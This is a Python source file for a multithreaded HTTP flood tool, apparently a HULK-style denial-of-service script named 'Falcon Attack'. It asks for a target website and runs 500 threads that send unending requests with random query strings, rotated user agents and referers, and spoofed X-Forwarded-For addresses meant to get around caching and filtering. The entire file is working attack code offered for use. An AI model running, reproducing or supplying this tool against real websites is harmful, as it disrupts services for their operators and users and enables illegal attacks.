import urllib.request
import concurrent.futures
import random
import re
import sys, os
from colorama import Fore
import threading
import string
from halo import Halo
import time
from logo import logo
from ipFake import random_ipFake
from userAgent import uagent

# -------------------------
global params
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0
__version__ = '8.0'
__author__ = "Al-Mohammady Team."
__method__ = 'HTTP'

# قفل لتأمين العداد في البرمجة متعددة الخيوط
counter_lock = threading.Lock()

def inc_counter():
    global request_counter
    with counter_lock:
        request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

# generates a referer array with caching
def referer_list():
    global headers_referers
    if not headers_referers:  # تحميل فقط إذا كانت القائمة فارغة
        with open('Tools/referers.txt', 'r') as file:
            headers_referers = [line.strip() for line in file]
    return random.sample(headers_referers, 2)

# builds random ASCII string
def buildblock(size):
    return ''.join(random.choice(string.ascii_uppercase) for _ in range(size))

# Spinner to indicate the method
def usage():
    spinner = Halo()
    spinner.succeed(f'Method : {__method__}.')
    spinner.stop()
    print('-'*40)

# http request with retry and backoff
def httpcall(url):
    retries = 3
    for i in range(retries):
        code = 0
        try:
            if url.count("?") > 0:
                param_joiner = "&"
            else:
                param_joiner = "?"
            payload = buildblock(random.randint(0, 10)) + '=' + buildblock(random.randint(0,10))
            request_url = url + param_joiner + payload
            headers = {
                'User-Agent': random.choice(uagent),
                'Cache-Control': 'no-cache',
                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Referer': random.choice(referer_list()) + buildblock(random.randint(0, 10)),
                'Keep-Alive': str(random.randint(120, 130)),
                'Connection': 'keep-alive',
                'Host': host,
                'X-Forwarded-For': random_ipFake()
            }

            urllib.request.urlopen(urllib.request.Request(request_url, headers=headers))
            inc_counter()
            time.sleep(random.uniform(0.01, 0.05))  # تأخير عشوائي بين الطلبات
            break  # إذا نجح الطلب، الخروج من حلقة المحاولات

        except urllib.error.HTTPError as e:
            if i < retries - 1:
                time.sleep(2 ** i)  # زيادة زمن الانتظار تدريجياً
            else:
                set_flag(1)
                print(f"{Fore.RED}[ {e.code} ] {Fore.MAGENTA} HTTP Error!")
                code = 500

        except urllib.error.URLError as e:
            if i < retries - 1:
                time.sleep(2 ** i)
            else:
                sys.exit()

    return code

# http caller function
def http_caller(url):
    while flag < 2:
        code = httpcall(url)
        if code == 500 and safe == 1:
            pass

# monitors http threads and counts requests with delay
def monitor_thread():
    sent = 0
    previous = request_counter
    while flag == 0:
        if previous + 100 < request_counter and previous != request_counter:
            sent += 1
            print(f"{Fore.YELLOW}[ {sent} ] {Fore.GREEN}Request Sent! Payload Size : {Fore.YELLOW}{request_counter}.")
            previous = request_counter
        time.sleep(0.5)  # تأخير بسيط بين التحديثات

    if flag == 2:
        print(f"\n{Fore.RED}-- Falcon Attack Finish --{Fore.RESET}")

# execute
if __name__ == "__main__":
    os.system('clear')
    logo()
    usage()

    url = input(f"{Fore.YELLOW}[ ? ]{Fore.GREEN} Website Target  : ")

    if url.count("/") == 2:
        url = url + "/"

    m = re.search('(https?://)?([^/]*)/?.*', url)
    host = m.group(2)

    safe_option = input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Mode < safe > (yes / no) : ").lower()
    if safe_option == "yes":
        set_safe()

    # Using ThreadPoolExecutor to run multiple threads concurrently
    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:  # استخدام عدد معقول من الخيوط
        future_to_url = {executor.submit(http_caller, url): url for _ in range(500)}

        # Starting the monitor thread
        t = threading.Thread(target=monitor_thread)
        t.start()

        # Waiting for all tasks to complete
        for future in concurrent.futures.as_completed(future_to_url):
            future.result()

        # Waiting for the monitor thread to finish
        t.join()